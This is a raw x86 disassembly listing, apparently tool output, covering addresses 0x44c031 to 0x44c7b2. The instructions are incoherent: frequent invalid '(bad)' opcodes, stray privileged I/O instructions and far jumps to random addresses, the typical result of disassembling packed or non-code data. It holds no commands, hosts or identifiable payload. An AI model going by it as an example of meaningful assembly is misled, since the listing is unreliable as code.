  44c031:	ret    0x4cdc
  44c034:	xor    al,0xb1
  44c036:	enter  0x7914,0x95
  44c03a:	mov    ch,0xe7
  44c03c:	sbb    eax,0xed12bba1
  44c041:	inc    edx
  44c042:	xchg   bh,bl
  44c044:	or     ebx,DWORD PTR gs:[eax]
  44c047:	mov    ecx,0x554f39bd
  44c04c:	xchg   ebp,eax
  44c04d:	mov    ebp,0xcc76f15c
  44c052:	retf   
  44c053:	jae    0x44c090
  44c055:	and    ebx,DWORD PTR [eax-0x7e]
  44c058:	daa    
  44c059:	pop    es
  44c05a:	test   al,0x62
  44c05c:	mov    ah,0x4a
  44c05e:	fsubr  QWORD PTR [edx-0x214e50fe]
  44c064:	and    DWORD PTR [ecx-0x1e],ecx
  44c067:	dec    ebx
  44c068:	mov    dl,0x45
  44c06a:	mov    bl,0x41
  44c06c:	fst    QWORD PTR [ebp-0x14]
  44c06f:	out    0x52,eax
  44c071:	mov    esi,0x7ded89d6
  44c076:	and    esp,ebp
  44c078:	aad    0xa8
  44c07a:	cmp    esi,edi
  44c07c:	lea    ebx,[ebx]
  44c07e:	neg    DWORD PTR [edx]
  44c080:	cld    
  44c081:	pushf  
  44c082:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c083:	add    BYTE PTR [ebx+0x4014b40b],bh
  44c089:	pop    eax
  44c08a:	in     al,0xcd
  44c08c:	mov    al,ds:0x1bf46b99
  44c091:	sub    al,0xbf
  44c093:	cmp    al,0x1f
  44c095:	xchg   DWORD PTR [ecx-0x4bd92b67],edx
  44c09b:	hlt    
  44c09c:	adc    al,0xba
  44c09e:	inc    edi
  44c09f:	or     bl,BYTE PTR [edi-0x1e92544f]
  44c0a5:	and    BYTE PTR [edi],cl
  44c0a7:	push   ds
  44c0a8:	xor    esp,DWORD PTR [edx+0x28]
  44c0ab:	sbb    dl,BYTE PTR [eax]
  44c0ad:	(bad)  
  44c0af:	test   al,0x5d
  44c0b1:	fmul   st,st(7)
  44c0b3:	icebp  
  44c0b4:	sbb    BYTE PTR [esi+0x62],0x1b
  44c0b8:	sub    DWORD PTR [ecx-0x3c024d46],ebp
  44c0be:	mov    dh,0xa4
  44c0c0:	ja     0x44c0ba
  44c0c2:	xchg   esp,eax
  44c0c3:	mov    dh,0xe3
  44c0c5:	inc    ebx
  44c0c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c0c7:	jbe    0x44c116
  44c0c9:	pop    ecx
  44c0ca:	adc    edx,edx
  44c0cc:	cli    
  44c0cd:	sbb    eax,0x4d3961db
  44c0d2:	scas   eax,DWORD PTR es:[edi]
  44c0d3:	(bad)  
  44c0d4:	sbb    cl,bl
  44c0d6:	sub    ch,BYTE PTR [eax+eiz*1-0xa]
  44c0da:	inc    ebx
  44c0db:	les    esp,FWORD PTR [ebx]
  44c0dd:	stc    
  44c0de:	xchg   edx,esi
  44c0e0:	iret   
  44c0e1:	sub    eax,0x99736c6c
  44c0e6:	sub    ebp,DWORD PTR ds:0xdae458fa
  44c0ec:	div    BYTE PTR [ebx*2-0x1b5cde97]
  44c0f3:	mov    ebx,0x76945918
  44c0f8:	(bad)  
  44c0f9:	cdq    
  44c0fa:	int3   
  44c0fb:	adc    eax,0xfcc0f95
  44c100:	lahf   
  44c101:	mov    cs,edx
  44c103:	cmp    DWORD PTR [ebp-0x2b],ecx
  44c106:	xchg   esp,eax
  44c107:	call   0x85e99f25
  44c10c:	pushf  
  44c10d:	mov    esi,0x87b9fee6
  44c112:	(bad)  [esi+0x659e6968]
  44c118:	cmp    DWORD PTR [edx+0x6],edi
  44c11b:	call   0xf6b05c37
  44c120:	mov    ebp,0xa693d442
  44c125:	xor    eax,edi
  44c127:	adc    al,0xce
  44c129:	sub    esi,DWORD PTR [esi+0x2d6c63a4]
  44c12f:	xchg   ebx,eax
  44c130:	xchg   ebp,eax
  44c131:	nop
  44c132:	or     eax,0x946d2feb
  44c137:	rcr    DWORD PTR [esi],cl
  44c139:	pop    ecx
  44c13a:	adc    eax,DWORD PTR [eax-0x1f653f8a]
  44c140:	xor    bl,BYTE PTR [ebx+eax*4+0x6c]
  44c144:	test   esp,ebx
  44c146:	stc    
  44c147:	jmp    0xcaf1:0x4feb8194
  44c14e:	adc    eax,DWORD PTR [edx+0x17]
  44c151:	cmp    DWORD PTR [ebx+0x32deb5ea],eax
  44c157:	pop    ecx
  44c158:	(bad)  
  44c15b:	out    0x3a,eax
  44c15d:	add    eax,0xc75bebc3
  44c162:	inc    esi
  44c163:	lods   al,BYTE PTR ds:[esi]
  44c164:	pop    es
  44c165:	adc    BYTE PTR [eax-0x4085b4cc],bh
  44c16b:	pop    esp
  44c16c:	ss pusha 
  44c16e:	hlt    
  44c16f:	fbld   TBYTE PTR [ecx]
  44c171:	ja     0x44c148
  44c173:	jbe    0x44c11f
  44c175:	cmp    edx,DWORD PTR [ecx]
  44c177:	xchg   esi,eax
  44c178:	repnz hlt 
  44c17a:	out    0x34,al
  44c17c:	jle    0x44c1af
  44c17e:	or     ah,BYTE PTR [ebx]
  44c180:	and    eax,0x64be0346
  44c185:	call   0xdc7e:0x9878aab
  44c18c:	jge    0x44c1fa
  44c18e:	pop    esi
  44c18f:	xor    al,0x13
  44c191:	mov    eax,ds:0xf5e2884b
  44c196:	add    eax,0x9ba52366
  44c19b:	stos   BYTE PTR es:[edi],al
  44c19c:	mov    esp,0xbae7dcb9
  44c1a1:	cmp    eax,DWORD PTR [ecx+0x45]
  44c1a4:	lock jnp 0x44c18d
  44c1a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44c1a8:	scas   al,BYTE PTR es:[edi]
  44c1a9:	(bad)  
  44c1aa:	mov    ecx,0xeba63fc4
  44c1af:	xchg   ebx,eax
  44c1b0:	cwde   
  44c1b1:	mov    ch,0xd1
  44c1b3:	dec    edi
  44c1b4:	stc    
  44c1b5:	xchg   esp,eax
  44c1b6:	dec    edx
  44c1b7:	or     eax,0xb4ec93fb
  44c1bc:	in     eax,0x21
  44c1be:	aaa    
  44c1bf:	test   eax,0x4e7bbca9
  44c1c4:	or     eax,0x24db095c
  44c1c9:	jne    0x44c195
  44c1cb:	jbe    0x44c17e
  44c1cd:	lods   al,BYTE PTR ds:[esi]
  44c1ce:	dec    esi
  44c1cf:	cmp    eax,0xa8f20cf7
  44c1d4:	pop    ds
  44c1d5:	jl     0x44c190
  44c1d7:	je     0x44c1aa
  44c1d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44c1da:	sti    
  44c1db:	mov    ds:0xbcc1d231,al
  44c1e0:	or     al,0x74
  44c1e2:	jge    0x44c250
  44c1e4:	jno    0x44c1b2
  44c1e6:	mov    ah,0x84
  44c1e8:	push   es
  44c1e9:	imul   esp,ebp,0xffffff91
  44c1ec:	and    eax,0x98ee348d
  44c1f1:	aad    0x8c
  44c1f3:	(bad)  
  44c1f4:	push   edx
  44c1f5:	mov    edx,0x4951183a
  44c1fa:	in     al,0x1c
  44c1fc:	pushf  
  44c1fd:	sbb    eax,0x8945e576
  44c202:	jge    0x44c27f
  44c204:	daa    
  44c205:	mov    esp,?
  44c207:	scas   al,BYTE PTR es:[edi]
  44c208:	dec    ecx
  44c209:	mov    cl,0x57
  44c20b:	mov    esp,0x5917551e
  44c210:	gs cwde 
  44c212:	mov    ah,0x53
  44c214:	fmul   st(3),st
  44c216:	lahf   
  44c217:	lods   al,BYTE PTR ds:[esi]
  44c218:	and    bh,cl
  44c21a:	int    0xad
  44c21c:	(bad)  
  44c21d:	push   edx
  44c21e:	stc    
  44c21f:	jp     0x44c1c6
  44c221:	test   al,0xbb
  44c223:	das    
  44c224:	lods   eax,DWORD PTR ds:[esi]
  44c225:	mov    al,BYTE PTR [edi]
  44c227:	aad    0x3c
  44c229:	mov    edx,0xa0b5b705
  44c22e:	mov    bl,0xd4
  44c230:	(bad)  
  44c231:	pusha  
  44c232:	inc    ebp
  44c233:	adc    ch,dl
  44c235:	mov    ecx,0xf1d7f07d
  44c23a:	cmovnp ebx,ebp
  44c23d:	or     BYTE PTR [edx-0x37],0x7d
  44c241:	shl    BYTE PTR [edx],0x90
  44c244:	div    BYTE PTR ds:0x1b66b4e1
  44c24a:	sbb    DWORD PTR [ebp-0xa346097],ebp
  44c250:	pop    es
  44c251:	mov    dl,BYTE PTR [eax+0x2f]
  44c254:	or     al,0x9f
  44c256:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44c257:	in     eax,dx
  44c258:	xchg   esi,eax
  44c259:	(bad)  
  44c25a:	mov    al,0x94
  44c25c:	inc    edi
  44c25d:	or     dl,BYTE PTR [ebx]
  44c25f:	dec    esi
  44c260:	xchg   BYTE PTR ds:0x9d855c42,dl
  44c266:	mov    bh,0x2a
  44c268:	cld    
  44c269:	xchg   ebx,eax
  44c26b:	mov    esp,0x64cdb432
  44c270:	or     al,0x2a
  44c272:	jg     0x44c2eb
  44c274:	sbb    bl,BYTE PTR [ebp+0x291140bb]
  44c27a:	shr    BYTE PTR [esi+0x1aa9b3f6],cl
  44c280:	sbb    al,BYTE PTR [edi+0x3e16d52b]
  44c286:	cmp    ch,BYTE PTR [eax-0x45]
  44c289:	adc    ebp,DWORD PTR [ecx+edi*4+0x2f]
  44c28d:	mov    bl,0x7f
  44c28f:	mov    ecx,0xecfe5731
  44c294:	and    bh,cl
  44c296:	mov    bl,0xf6
  44c298:	sbb    ebp,ebp
  44c29a:	or     DWORD PTR ds:0xf29c016d,edx
  44c2a0:	mov    cl,ch
  44c2a2:	popf   
  44c2a3:	gs push ss
  44c2a5:	stc    
  44c2a6:	ret    0x49cf
  44c2a9:	test   al,0xb5
  44c2ab:	(bad)  
  44c2ac:	jo     0x44c251
  44c2ae:	or     eax,eax
  44c2b0:	xchg   ebx,eax
  44c2b1:	and    eax,0x319bbec1
  44c2b6:	pop    eax
  44c2b7:	mov    ebp,0x2412a920
  44c2bc:	sbb    al,0x93
  44c2be:	retf   
  44c2bf:	xchg   DWORD PTR ss:[ebx+0x16b1c30b],ebx
  44c2c6:	xchg   edi,eax
  44c2c7:	aam    0xf3
  44c2c9:	ficom  WORD PTR [eax]
  44c2cb:	arpl   WORD PTR [edi+0x16983578],si
  44c2d1:	or     DWORD PTR [eax-0x3e],ebx
  44c2d4:	dec    eax
  44c2d5:	imul   ebx,edi,0x25
  44c2d8:	test   DWORD PTR [eax-0x23],edi
  44c2db:	out    0xf2,eax
  44c2dd:	outs   dx,DWORD PTR ds:[esi]
  44c2de:	xchg   esp,eax
  44c2df:	jp     0x44c304
  44c2e1:	jmp    0x7878ff63
  44c2e6:	jnp    0x44c2eb
  44c2e8:	addr16 mov ds:0x6329,eax
  44c2ec:	inc    esi
  44c2ed:	add    edx,esi
  44c2ef:	fstp   DWORD PTR [eax]
  44c2f1:	out    0x7d,eax
  44c2f3:	pop    ebp
  44c2f4:	ret    0x3138
  44c2f7:	enter  0x8946,0xb6
  44c2fb:	push   esp
  44c2fc:	pop    esp
  44c2fd:	inc    eax
  44c2fe:	repz jmp 0xa387:0xe7462455
  44c306:	sbb    al,ch
  44c308:	cmpxchg ecx,esp
  44c30b:	repnz xchg esi,eax
  44c30d:	sar    BYTE PTR [ebp-0x7bfef09c],0x1b
  44c314:	mov    eax,fs:0x5a396f1b
  44c31a:	fcmovnbe st,st(2)
  44c31c:	sub    eax,0xfeaed6f1
  44c321:	dec    edi
  44c322:	mov    ecx,0x65038aa4
  44c327:	and    al,0xe5
  44c329:	daa    
  44c32a:	mov    bl,0xf2
  44c32c:	stos   DWORD PTR es:[edi],eax
  44c32d:	jle    0x44c375
  44c32f:	cmp    eax,0x32e6598e
  44c334:	xor    al,0x52
  44c336:	pop    eax
  44c337:	(bad)  
  44c338:	jle    0x44c2e8
  44c33a:	mov    cl,0x2
  44c33c:	push   ebp
  44c33d:	loop   0x44c30b
  44c33f:	out    dx,eax
  44c340:	cwde   
  44c341:	cdq    
  44c342:	xchg   esp,eax
  44c343:	mov    BYTE PTR ds:0xdc8f1389,bl
  44c349:	out    dx,eax
  44c34a:	jge    0x44c355
  44c34c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c34d:	popf   
  44c34e:	cmp    ebp,DWORD PTR [edx]
  44c350:	fnstsw WORD PTR [eax]
  44c352:	jmp    0xdb37b10a
  44c357:	out    dx,al
  44c358:	mov    dh,0x7a
  44c35a:	test   al,0x75
  44c35c:	and    eax,0x82f13fc4
  44c361:	sahf   
  44c362:	sti    
  44c363:	dec    ebp
  44c364:	(bad)  
  44c366:	fwait
  44c367:	xlat   BYTE PTR ds:[ebx]
  44c368:	nop
  44c369:	test   al,0xc
  44c36b:	pop    ebp
  44c36c:	adc    al,0x33
  44c36e:	mov    esi,0x54100bb4
  44c373:	cmp    al,0xbe
  44c375:	mov    ah,0xbb
  44c377:	out    0x12,al
  44c379:	retf   0x10b7
  44c37c:	jle    0x44c3e4
  44c37e:	fwait
  44c37f:	inc    BYTE PTR [esi-0x17]
  44c382:	fstp   DWORD PTR [edi]
  44c384:	retf   
  44c385:	xor    DWORD PTR [edx],ebp
  44c387:	xchg   ecx,eax
  44c388:	aas    
  44c389:	mov    DWORD PTR [ecx-0x3],0x7bbb9ca5
  44c390:	add    ecx,DWORD PTR [edx-0x1948f8d5]
  44c396:	ror    DWORD PTR [edi-0x43b196e6],cl
  44c39c:	(bad)  
  44c39d:	mov    ds:0xa3940a34,eax
  44c3a2:	dec    ebx
  44c3a3:	shl    BYTE PTR [eax-0x32],cl
  44c3a6:	outs   dx,DWORD PTR ds:[esi]
  44c3a7:	sbb    eax,0xf85fa23d
  44c3ac:	sbb    DWORD PTR [ecx-0x4142b3f7],edi
  44c3b2:	icebp  
  44c3b3:	mov    ebx,0x84ac1789
  44c3b8:	sub    BYTE PTR [eax-0x32f37e99],ch
  44c3be:	out    dx,al
  44c3bf:	call   0xe5980cde
  44c3c4:	sub    dh,bh
  44c3c6:	call   0x143:0x4ba1584b
  44c3cd:	push   ecx
  44c3ce:	jmp    0x44c41c
  44c3d0:	daa    
  44c3d1:	popa   
  44c3d2:	xor    edx,0x24b62a8a
  44c3d8:	push   eax
  44c3d9:	dec    eax
  44c3da:	xlat   BYTE PTR ds:[ebx]
  44c3db:	retf   
  44c3dc:	mov    ch,0xa6
  44c3de:	cmp    cl,ch
  44c3e0:	mov    edi,DWORD PTR [ecx-0x34]
  44c3e3:	rcl    DWORD PTR [edx+edi*4],cl
  44c3e6:	cmp    ebx,DWORD PTR [eax]
  44c3e8:	rol    BYTE PTR [ebx-0x603ba2d2],0x5b
  44c3ef:	sahf   
  44c3f0:	lods   eax,DWORD PTR ds:[esi]
  44c3f1:	jl     0x44c429
  44c3f3:	repz jge 0x44c3a3
  44c3f6:	jnp    0x44c42d
  44c3f8:	adc    BYTE PTR [eax+ebx*2-0x6b6c2bad],0x84
  44c400:	jmp    0x46247655
  44c405:	fldcw  WORD PTR [edx]
  44c407:	in     eax,0x76
  44c409:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44c40a:	mov    ebx,0x14c5b515
  44c40f:	fcom   DWORD PTR [ecx-0x3e]
  44c412:	(bad)  
  44c413:	dec    edx
  44c414:	or     bh,BYTE PTR [edx-0x5f8243c5]
  44c41a:	mov    ebx,0x6640bf5c
  44c41f:	addr16 cmc 
  44c421:	out    dx,al
  44c422:	int    0xed
  44c424:	test   al,0x7b
  44c426:	leave  
  44c427:	sub    ebx,DWORD PTR ds:0x901419d9
  44c42d:	or     bh,BYTE PTR [ebx-0x43d38f5a]
  44c433:	dec    esi
  44c434:	aam    0xb5
  44c436:	dec    edi
  44c437:	jmp    0x14fa8d0b
  44c43c:	add    DWORD PTR [ebp-0x53da3b73],edi
  44c442:	adc    al,0xe9
  44c444:	popa   
  44c445:	xchg   esp,edi
  44c447:	pop    ecx
  44c448:	out    0x86,al
  44c44a:	or     DWORD PTR [edi],eax
  44c44c:	adc    BYTE PTR [eax+0x6b87a5],dl
  44c452:	mov    ch,0x38
  44c454:	add    ch,BYTE PTR [esi-0x4f]
  44c457:	(bad)  
  44c458:	iret   
  44c459:	inc    ebx
  44c45a:	cmp    cl,dl
  44c45c:	adc    eax,0x70e9c9a0
  44c461:	ds std 
  44c463:	ficomp WORD PTR [ebx]
  44c465:	leave  
  44c466:	scas   eax,DWORD PTR es:[edi]
  44c467:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c468:	xor    al,0xd3
  44c46a:	or     ebp,DWORD PTR [edi-0x4]
  44c46d:	pop    ss
  44c46e:	adc    esp,DWORD PTR [esi]
  44c470:	pop    ecx
  44c471:	xchg   esi,eax
  44c472:	outs   dx,DWORD PTR gs:[esi]
  44c474:	mov    dl,BYTE PTR [ebx+0x362aecb1]
  44c47a:	jae    0x44c41c
  44c47c:	xor    al,0xc8
  44c47e:	mov    ch,0x74
  44c480:	add    DWORD PTR [ebp+0x465d3b5],0x19
  44c487:	repz sub DWORD PTR [edi],esp
  44c48a:	mov    DWORD PTR [ecx-0x12c8f491],ecx
  44c490:	mov    ebx,DWORD PTR [edx+0x13272ab]
  44c496:	mov    edx,0xa53d9d3c
  44c49b:	loope  0x44c4c1
  44c49d:	sub    DWORD PTR [ebx],ecx
  44c49f:	or     al,0x7b
  44c4a1:	ss int 0xa0
  44c4a4:	push   ebp
  44c4a5:	pop    edi
  44c4a6:	and    DWORD PTR [edx-0x47],esp
  44c4a9:	mov    al,ds:0x4f660a32
  44c4ae:	dec    ebx
  44c4af:	pop    ss
  44c4b0:	(bad)  
  44c4b1:	pop    ss
  44c4b2:	test   esi,ebp
  44c4b4:	dec    ecx
  44c4b5:	inc    ebx
  44c4b6:	mov    esp,0xb7ccb292
  44c4bb:	push   esp
  44c4bc:	cmp    dh,dh
  44c4be:	or     eax,esp
  44c4c0:	(bad)  
  44c4c1:	sub    eax,0x9366c9b8
  44c4c6:	inc    edx
  44c4c7:	fiadd  DWORD PTR [edx-0x46a97456]
  44c4cd:	test   al,0xc2
  44c4cf:	or     al,0x21
  44c4d1:	jns    0x44c539
  44c4d3:	fs ret 
  44c4d5:	sti    
  44c4d6:	ret    
  44c4d7:	popa   
  44c4d8:	mov    esp,DWORD PTR [ecx+0x5765226a]
  44c4de:	and    DWORD PTR [eax-0x2b],edi
  44c4e1:	mov    bl,0x7b
  44c4e3:	imul   ebx,DWORD PTR [ebx+0x5b5d9e19],0x2aea91f
  44c4ed:	sub    edi,DWORD PTR [ebx+0x23]
  44c4f0:	sbb    bh,BYTE PTR [ecx-0x74]
  44c4f3:	mov    dh,0x8f
  44c4f5:	call   0xece2:0x9b956adf
  44c4fc:	add    eax,0x1db196b5
  44c501:	sbb    DWORD PTR ds:0x5fcebe71,ebx
  44c507:	(bad)  
  44c508:	jmp    0x75fae0b0
  44c50d:	ins    BYTE PTR es:[edi],dx
  44c50e:	arpl   WORD PTR [esi+0x7ae0c451],si
  44c514:	sbb    al,0x62
  44c516:	mov    al,0x24
  44c518:	cld    
  44c519:	addr16 mov ebx,0x8d3a35d5
  44c51f:	out    0x5d,al
  44c521:	scas   al,BYTE PTR es:[edi]
  44c522:	outs   dx,BYTE PTR ds:[esi]
  44c523:	xor    DWORD PTR [ecx+edi*8],ebx
  44c526:	xor    DWORD PTR [ebx],edx
  44c528:	or     DWORD PTR [ecx-0x70],ebp
  44c52b:	jle    0x44c522
  44c52d:	jnp    0x44c4be
  44c52f:	ret    0x9120
  44c532:	fidiv  DWORD PTR [edx-0x5902d4d]
  44c538:	push   ds
  44c539:	dec    ecx
  44c53a:	scas   al,BYTE PTR es:[edi]
  44c53b:	cmp    bh,BYTE PTR [edx]
  44c53d:	sbb    al,0xe7
  44c53f:	add    BYTE PTR [edx+0x19ce7059],ch
  44c545:	cmp    DWORD PTR [esi-0x3032fef4],esi
  44c54b:	repnz and al,0x39
  44c54e:	shr    DWORD PTR [esi+0x72],1
  44c551:	shl    BYTE PTR [edx+0x4a],cl
  44c554:	xchg   esp,eax
  44c555:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c556:	sti    
  44c557:	push   es
  44c558:	sbb    al,0xc6
  44c55a:	adc    BYTE PTR [eax+0x7491e3c8],dl
  44c560:	paddusw mm7,QWORD PTR [edx+0x4c502b64]
  44c567:	icebp  
  44c568:	push   ebp
  44c569:	(bad)  
  44c56a:	mov    esi,0x1944beeb
  44c56f:	and    eax,0x77a3391e
  44c574:	cmovbe esp,ecx
  44c577:	clc    
  44c578:	mov    ah,0x60
  44c57a:	sub    eax,0x589177ea
  44c57f:	dec    ebp
  44c580:	sbb    eax,0xd2d0fdd9
  44c585:	dec    edi
  44c586:	xchg   ecx,eax
  44c587:	pop    ebp
  44c588:	enter  0xbf91,0x44
  44c58c:	xchg   BYTE PTR [eax+esi*1-0x7d],dh
  44c590:	cmp    eax,0xba405c8d
  44c595:	js     0x44c5ce
  44c597:	dec    eax
  44c598:	cmp    ah,BYTE PTR [ecx-0x45]
  44c59b:	inc    eax
  44c59c:	sbb    ebp,DWORD PTR [ecx+0x43]
  44c59f:	add    DWORD PTR [ebx-0x7876d666],edi
  44c5a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c5a6:	sub    edi,edi
  44c5a8:	ins    DWORD PTR es:[edi],dx
  44c5a9:	leave  
  44c5aa:	inc    ebx
  44c5ab:	mov    WORD PTR [edi],?
  44c5ad:	out    dx,al
  44c5ae:	push   ds
  44c5af:	sbb    DWORD PTR [ebp+ebp*4+0x5d06bc38],0x9a071058
  44c5ba:	push   ebx
  44c5bb:	jb     0x44c547
  44c5bd:	add    bh,0xbf
  44c5c0:	sbb    al,BYTE PTR [ecx]
  44c5c2:	mov    esi,DWORD PTR [eax+esi*2-0x75]
  44c5c6:	add    dl,BYTE PTR [ebp-0x4f]
  44c5c9:	and    eax,0x2724edfa
  44c5ce:	push   ds
  44c5cf:	aam    0xf4
  44c5d1:	mov    edi,0xc33df4b9
  44c5d6:	loopne 0x44c655
  44c5d8:	mov    ch,0x6f
  44c5da:	and    bh,ah
  44c5dc:	dec    ebp
  44c5dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c5de:	cdq    
  44c5df:	inc    esp
  44c5e0:	(bad)  
  44c5e1:	(bad)  
  44c5e2:	adc    ebp,esp
  44c5e4:	pop    ebx
  44c5e5:	or     BYTE PTR [edi-0xdda4adc],dh
  44c5eb:	jne    0x44c572
  44c5ed:	mov    bl,0x76
  44c5ef:	in     eax,0x2b
  44c5f1:	dec    eax
  44c5f2:	lds    edi,FWORD PTR [eax+0x4c786916]
  44c5f8:	add    al,0x85
  44c5fa:	jo     0x44c604
  44c5fc:	ss test al,0x4b
  44c5ff:	mov    ecx,esp
  44c601:	in     al,0xdf
  44c603:	imul   edi,DWORD PTR [edi],0x5a2e6c51
  44c609:	cwde   
  44c60a:	mov    cl,0xb4
  44c60c:	test   al,0x9e
  44c60e:	aad    0x8
  44c610:	jne    0x44c5c8
  44c612:	push   cs
  44c613:	in     eax,dx
  44c614:	push   eax
  44c615:	ins    DWORD PTR es:[edi],dx
  44c616:	push   esi
  44c617:	mov    esp,DWORD PTR [eax]
  44c619:	cmp    DWORD PTR [edi+ecx*1-0x32],eax
  44c61d:	adc    eax,0xb4bce238
  44c622:	sub    edx,DWORD PTR [esi]
  44c624:	adc    bh,bh
  44c626:	clc    
  44c627:	out    0x48,eax
  44c629:	call   0xd049:0xdc96a57e
  44c630:	push   ebp
  44c631:	xor    edx,DWORD PTR [ecx+0x604db0fd]
  44c637:	dec    eax
  44c638:	add    edi,DWORD PTR gs:[ebp-0x6431ca09]
  44c63f:	push   eax
  44c640:	cmp    esi,DWORD PTR [ecx]
  44c642:	scas   al,BYTE PTR es:[edi]
  44c643:	mov    DWORD PTR [eax+0x412db29f],eax
  44c649:	(bad)  
  44c64a:	mov    al,0xa4
  44c64c:	js     0x44c60e
  44c64e:	ins    DWORD PTR es:[edi],dx
  44c64f:	cmc    
  44c650:	xlat   BYTE PTR ds:[ebx]
  44c651:	inc    ecx
  44c652:	and    ecx,ebp
  44c654:	xor    DWORD PTR [eax+0x7c],ecx
  44c657:	repz mov bl,0xb7
  44c65a:	(bad)  
  44c65c:	xor    bl,BYTE PTR [ebx-0x48]
  44c65f:	les    esp,FWORD PTR [eax]
  44c661:	mov    ebp,0x6a75e2cc
  44c666:	sbb    esp,ebp
  44c668:	jmp    0x44c683
  44c66a:	push   edi
  44c66b:	leave  
  44c66c:	push   ebp
  44c66d:	jmp    0x8b547853
  44c672:	push   0xffffffd6
  44c674:	ror    DWORD PTR [esi-0x76f48f11],0x11
  44c67b:	mov    ah,0x34
  44c67d:	inc    esi
  44c67e:	loopne 0x44c604
  44c680:	and    DWORD PTR ds:0x98fac64e,edx
  44c686:	inc    edx
  44c687:	sbb    esp,0x40
  44c68a:	and    edx,DWORD PTR [ebp+0x67524121]
  44c690:	gs cdq 
  44c692:	cmp    esi,DWORD PTR ds:0x67ce2dba
  44c698:	cmp    al,0x1e
  44c69a:	clc    
  44c69b:	inc    esi
  44c69c:	dec    ebx
  44c69d:	sbb    esp,edx
  44c69f:	mov    dl,0xbd
  44c6a1:	push   0x1
  44c6a3:	pop    edi
  44c6a4:	aam    0xb6
  44c6a6:	dec    ecx
  44c6a7:	in     al,dx
  44c6a8:	gs stos BYTE PTR es:[edi],al
  44c6aa:	enter  0xbee8,0x61
  44c6ae:	and    al,0xbe
  44c6b0:	call   0x160f8801
  44c6b5:	packuswb mm5,mm7
  44c6b8:	jg     0x44c6a3
  44c6ba:	mov    dh,0x2d
  44c6bc:	xchg   ebp,eax
  44c6bd:	shl    ecx,0xe4
  44c6c0:	das    
  44c6c1:	outs   dx,DWORD PTR ds:[esi]
  44c6c2:	loopne 0x44c702
  44c6c4:	aaa    
  44c6c5:	clc    
  44c6c6:	bound  ebp,QWORD PTR [ebp-0x16]
  44c6c9:	mov    cl,0xba
  44c6cb:	in     al,0x92
  44c6cd:	sub    esp,eax
  44c6cf:	rcl    BYTE PTR [ebp+0x27],cl
  44c6d2:	jnp    0x44c6c2
  44c6d4:	out    0x43,al
  44c6d6:	mov    dl,al
  44c6d8:	and    eax,0xb67bb4d9
  44c6dd:	adc    dh,BYTE PTR [ecx+ecx*2+0x1b]
  44c6e1:	and    edx,DWORD PTR [ecx]
  44c6e3:	or     BYTE PTR [edi+0x59],dl
  44c6e6:	push   0x73a712f0
  44c6eb:	jge    0x44c73b
  44c6ed:	mov    bh,0x55
  44c6ef:	ins    DWORD PTR es:[edi],dx
  44c6f0:	in     eax,0x69
  44c6f2:	mov    cl,0x4
  44c6f4:	mov    esi,0x868738c3
  44c6f9:	clc    
  44c6fa:	pop    edx
  44c6fb:	pusha  
  44c6fc:	lea    esp,[edi+0x5e52b74c]
  44c702:	jle    0x44c6c8
  44c704:	loop   0x44c696
  44c706:	mov    bl,0x64
  44c708:	ret    0x6f0f
  44c70b:	adc    BYTE PTR [ebp-0x56],0xb1
  44c70f:	lock scas al,BYTE PTR es:[edi]
  44c711:	pop    ds
  44c712:	pop    edi
  44c713:	push   ds
  44c714:	sbb    al,0x89
  44c716:	scas   eax,DWORD PTR es:[edi]
  44c717:	cmp    al,BYTE PTR [edx]
  44c719:	and    DWORD PTR [eax],edx
  44c71b:	out    dx,eax
  44c71c:	sbb    al,BYTE PTR ds:0xf885ec4b
  44c722:	mov    esp,0x362a22ea
  44c727:	ret    
  44c728:	lods   al,BYTE PTR ds:[esi]
  44c729:	mov    WORD PTR [edi-0x7d],cs
  44c72c:	popf   
  44c72d:	or     BYTE PTR [ebx-0x11],dl
  44c730:	xchg   ebx,esi
  44c732:	inc    ebp
  44c733:	ins    DWORD PTR es:[edi],dx
  44c734:	push   es
  44c735:	mov    ecx,ebx
  44c737:	push   esp
  44c738:	mov    ch,BYTE PTR [ebp-0x5ca572d8]
  44c73e:	fnstsw WORD PTR [edi+0x23]
  44c741:	stc    
  44c742:	retf   
  44c743:	pop    ss
  44c744:	xchg   ebp,eax
  44c745:	mov    dh,0xbc
  44c747:	dec    esp
  44c748:	mov    ah,0xa6
  44c74a:	stos   DWORD PTR es:[edi],eax
  44c74b:	sub    bh,BYTE PTR [ebp+0x4e]
  44c74e:	dec    eax
  44c74f:	popf   
  44c750:	jno    0x44c7c4
  44c752:	jmp    0x44c70b
  44c754:	adc    ch,bl
  44c756:	mov    cl,0x24
  44c758:	push   ds
  44c759:	xor    ebx,DWORD PTR [ebx-0x35ef296e]
  44c75f:	adc    al,0x92
  44c761:	gs jbe 0x44c714
  44c764:	jbe    0x44c6ee
  44c766:	mov    bl,0xbf
  44c768:	mov    ebp,ebp
  44c76a:	mov    ecx,0x69770c64
  44c76f:	mov    eax,DWORD PTR [ebp+0x39e80678]
  44c775:	or     eax,0x6924ca65
  44c77a:	rcr    ch,cl
  44c77c:	mov    ss,WORD PTR [eax+ecx*1]
  44c77f:	pop    edi
  44c780:	loope  0x44c71e
  44c782:	cmp    edx,DWORD PTR [ecx-0x7e]
  44c785:	dec    BYTE PTR [esi-0x1c]
  44c788:	mov    esi,0xa921d9ba
  44c78d:	ret    0xf4b4
  44c790:	ja     0x44c7b3
  44c792:	les    esi,FWORD PTR ds:0x5df29803
  44c799:	fidivr WORD PTR [esi]
  44c79b:	and    edi,DWORD PTR [ecx]
  44c79d:	jmp    0xa02d940b
  44c7a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c7a3:	sti    
  44c7a4:	adc    edx,DWORD PTR [edx-0x7a5a0f15]
  44c7aa:	xor    eax,ebp
  44c7ac:	jmp    FWORD PTR [ecx+0x4b]
  44c7af:	pop    edx
  44c7b0:	sbb    al,0xc9
  44c7b2:	dec    eax
